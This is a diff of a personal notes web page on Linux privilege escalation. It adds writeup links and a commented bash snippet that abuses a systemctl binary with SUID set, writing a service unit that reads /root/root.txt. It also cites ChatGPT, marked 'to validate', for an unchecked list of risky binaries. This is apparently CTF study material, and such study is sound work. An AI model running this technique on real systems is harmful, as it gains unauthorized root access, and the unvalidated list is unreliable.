@@ -228,10 +228,25 @@
   <div class="content" itemprop="articleBody">
     <p><em>This is about &hellip; .</em></p>
 <h2 id="suid">SUID</h2>
-<p><strong>Reference</strong> 📚: <a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49">here</a>.</p>
+<p><strong>Writeups</strong> 📚:</p>
+<ul>
+<li><a href="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49">https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49</a></li>
+<li><a href="https://n0w4n.nl/vulnversity/">https://n0w4n.nl/vulnversity/</a></li>
+</ul>
 <h3 id="systemctl">systemctl</h3>
 <p>This process is used to start services, for example, an apache server: <code>sudo systemctl start apache2</code>. However, if this file is assigned SUID permissions by mistake, it can be used for privilege escalation.</p>
-<h3 id="other">Other</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">eop</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service <span class="c1"># create a temp file with a random unique name and store the name in a eop variable</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; ExecStart=/bin/sh -c &#34;cat /root/root.txt &gt; /tmp/output&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; [Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">&gt; WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$eop</span> <span class="c1"># write the config for the service into the file. This unit file will be used by the systemctl to run the process specified in the ExecStart variable. </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ❗️ Do not copy this code in whole, line by line without the &gt; sign, or else you will not get it work</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ❗️ I have added touch $eop but it&#39;s not required (it was in my case, cause I had an error)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$eop</span> <span class="c1"># This command in Linux creates a symbolic link for the service file specified in the &#34;$eop&#34; environment variable, in the &#34;/etc/systemd/system/&#34; directory, using the systemctl utility. The link created allows the service to be managed with systemctl commands.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$eop</span> <span class="c1"># This command in Linux enables and starts the service specified in the &#34;$eop&#34; environment variable, using the systemctl utility. The &#34;enable&#34; option makes the service to start at boot time, while the &#34;--now&#34; option starts the service immediately after the command is executed.</span>
+</span></span></code></pre></div><h3 id="other">Other</h3>
 <p><strong>Reference</strong> 📚: ChatGTP (to validate)</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/passwd: Used to change user passwords. A vulnerability in this file could allow an attacker to gain root privileges.
 </span></span><span class="line"><span class="cl">
